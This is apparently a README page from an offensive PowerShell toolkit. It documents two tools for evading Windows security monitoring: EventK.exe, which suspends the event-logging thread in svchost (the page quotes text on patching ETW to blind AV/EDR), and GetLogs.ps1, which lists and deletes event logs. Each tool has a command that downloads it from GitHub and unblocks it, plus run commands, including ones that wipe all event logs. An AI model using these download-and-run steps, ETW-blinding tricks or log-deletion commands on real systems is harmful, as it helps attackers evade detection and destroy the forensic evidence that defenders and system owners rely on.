## EventK.exe

|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|EventK|Suspend thread in svchost.exe related to event logging (@SolomonSklash)|Administrator|[Screenshot](https://naoexiste)|

<br />

**Download cmdlet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/ETWpatch/eventK.exe" -OutFile "eventK.exe"|Unblock-File
```

<br />

**Execute:**
```powershell
.\eventK.exe
```

<br />

**Final Notes:**
```powershell
[ETW Bypass]
Next up is coverage of Event Tracing for Windows (ETW), how it can rat you out to AV/EDR,
and how to blind it in your local process. ETW is especially relevant when executing .NET
assemblies, such as in Cobalt Strike’s execute-assembly, as it can inform defenders of the
exact assembly name and methods executed. The solution in this case is simple: Patch the
ETWEventWrite function to return early with 0 in the RAX register. Anytime an ETW event
is sent by the process, it will always succeed, without actually sending the message.
```

Article: https://www.solomonsklash.io/windows-evasion-course-review.html

<br />

## GetLogs.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|[GetLogs](https://github.com/r00t-3xp10it/redpill/blob/main/bin/GetLogs.ps1)|Enumerate \ Read \ Delete eventvwr logfiles (ETW)|User Land (enum) \ Administrator (delete)|[Screenshot1](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/ETWpatch/GetLogs-enum.png)<br />[Screenshot2](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/ETWpatch/GetLogs-yara.png)<br />[Screenshot3](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/ETWpatch/GetLogs-del.png)|

<br />

**Download cmdlet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLogs.ps1" -OutFile "GetLogs.ps1"
```

<br />

**Execute:**
```powershell
#Lists ALL eventvwr categorie entrys
.\GetLogs.ps1 -GetLogs 'Enum'

#List newest 3 (default) Powershell\Application\System entrys
.\GetLogs.ps1 -GetLogs 'Verbose'

#List newest 8 Powershell\Application\System entrys
.\GetLogs.ps1 -GetLogs 'Verbose' -NewEst '8'

#List newest 28 logs using cmdlet default Id's and categories!
.\GetLogs.ps1 -GetLogs 'Yara' -NewEst '28'
   
#List newest 13 logfiles with Id: 59 using cmdlet default categories!
.\GetLogs.ps1 -GetLogs 'Yara' -NewEst '13' -Id '59'
   
#List newest 10 logfiles of 'system' categorie with id: 1
.\GetLogs.ps1 -GetLogs 'Yara' -verb "system" -Id '1' -NewEst '10'

#List newest 3 (default) logfiles of 'NetworkProfile/Operational' categorie with Id: 10001
.\GetLogs.ps1 -GetLogs 'Yara' -Verb "Microsoft-Windows-NetworkProfile/Operational" -id '10001'

#Delete ALL eventvwr (categories) logs from snapIn!
.\GetLogs.ps1 -GetLogs 'DeleteAll'

#Delete ONLY logfiles from "Microsoft-Windows-Powershell/Operational" eventvwr categorie!
.\GetLogs.ps1 -GetLogs 'DeleteAll' -Verb "Microsoft-Windows-Powershell/Operational"
```
